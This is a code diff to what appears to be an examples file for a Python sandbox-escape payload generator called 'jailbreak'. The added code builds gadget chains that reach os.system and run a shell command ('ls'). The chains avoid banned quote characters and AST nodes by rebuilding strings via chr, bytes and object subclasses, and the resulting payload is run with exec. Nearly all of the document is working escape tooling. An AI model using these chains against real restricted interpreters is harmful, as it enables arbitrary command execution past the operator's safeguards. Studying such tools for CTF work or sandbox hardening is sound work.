@@ -48,7 +48,7 @@ def os__user():
     return os
 
 #reset config so jail requires the use of os__user
-jailbreak.config(char='\'"')
+jailbreak.config(char='\'"', ast=[ast.ListComp])
 #provide sys gadget
 jailbreak.register_user_gadget(os__user, 'python')
 
@@ -62,7 +62,6 @@ print("\n---------\n")
 def ls__user(*, get_shell):
     return get_shell('ls')
 
-jailbreak.config()
 jailbreak.register_user_gadget(ls__user, 'python')
 
 payload = jailbreak.ls()  #ls does not exist in repo gadgets, but is provided by user
@@ -138,3 +137,145 @@ with open(__file__) as f:
 print(haha(test, test2))
 print(a, b, f)
 """, in_scope=['range', 'print', 'open', 'Exception', '__file__']))
+
+print("\n---------\n")
+
+#
+# model specification usage examples
+#
+from jailbreak.models import *
+
+#generate a small example with converters
+jailbreak.config(provided=['os'], char='\'"')
+gadget = jailbreak.ls
+
+#prints the specification
+print(gadget)
+
+#call it to get the payload
+gadget_payload = gadget()   
+print(gadget_payload)
+
+#directly copied from the specification printed above
+static_gadget = PythonGadget(
+    name="ls__user",
+    dependencies=[
+        PythonGadget(
+            name="get_shell__os_system",
+            dependencies=[
+                PythonGadget(name="os", dependencies=[], dummy=True, converters=[])
+            ],
+            dummy=False,
+            converters=[],
+        )
+    ],
+    dummy=False,
+    converters=[
+        PythonConverter(
+            name="strless__chr",
+            dependencies=[
+                PythonGadget(
+                    name="chr__builtins",
+                    dependencies=[
+                        PythonGadget(
+                            name="builtins_dict__gi_builtins",
+                            dependencies=[],
+                            dummy=False,
+                            converters=[],
+                        )
+                    ],
+                    dummy=False,
+                    converters=[
+                        PythonConverter(
+                            name="strless__chr",
+                            dependencies=[
+                                PythonGadget(
+                                    name="chr__bytes",
+                                    dependencies=[
+                                        PythonGadget(
+                                            name="bytes__gen",
+                                            dependencies=[
+                                                PythonGadget(
+                                                    name="type__class",
+                                                    dependencies=[],
+                                                    dummy=False,
+                                                    converters=[],
+                                                )
+                                            ],
+                                            dummy=False,
+                                            converters=[],
+                                        )
+                                    ],
+                                    dummy=False,
+                                    converters=[],
+                                )
+                            ],
+                            dummy=False,
+                        )
+                    ],
+                )
+            ],
+            dummy=False,
+        )
+    ],
+)
+
+#they should generate the same payload
+#(the payload might actually change from above as new gadgets are added, but both should work)
+print(static_gadget())
+
+def str__user_builtin(*, builtins_dict):
+    return builtins_dict['str']
+def obj__user_builtin(*, builtins_dict):
+    return builtins_dict['object']
+
+jailbreak.register_user_gadget(str__user_builtin, 'python')
+jailbreak.register_user_gadget(obj__user_builtin, 'python')
+
+#generate a payload from a handmade chain
+
+#can cache converters for reuse in multiple parts of the chain
+strless_converter = PythonConverter(
+    name='strless__chr',
+    dependencies=[
+        #partial inline works as long as the whole chain is inlined
+        PythonGadgetInline(name='chr__bytes', dependencies=[PythonGadgetInline(name='bytes__gen', dependencies=[PythonGadgetInline(name='type__class')])])
+    ]
+)
+
+#gadgets also can be cached
+builtins_gadget = PythonGadget(name='builtins_dict__gi_builtins')
+
+#chain cherry picked to be small
+manual_chain = PythonGadget(
+    name='os__sys', 
+    dependencies=[
+        PythonGadget(
+            name='sys__wrap_close',
+            dependencies=[            
+                #can use user gadgets   
+                PythonGadget(
+                    name='str__user_builtin', 
+                    dependencies=[builtins_gadget],
+                    converters=[strless_converter]
+                ),
+                PythonGadget(
+                    name='list_classes__obj_subclass', 
+                    dependencies=[PythonGadget(name='obj__user_builtin', dependencies=[builtins_gadget], converters=[strless_converter])]
+                )
+            ],
+            #can use converters
+            converters=[strless_converter]
+        )
+    ]
+    #can partially apply converters (e.g. this gadget has a string in it but strless can be skipped on this)
+)
+
+print(manual_chain)
+manual_payload = manual_chain()
+print(manual_payload)
+
+#generate chain works
+env = {}
+exec(manual_payload, env)
+print(env['os'])
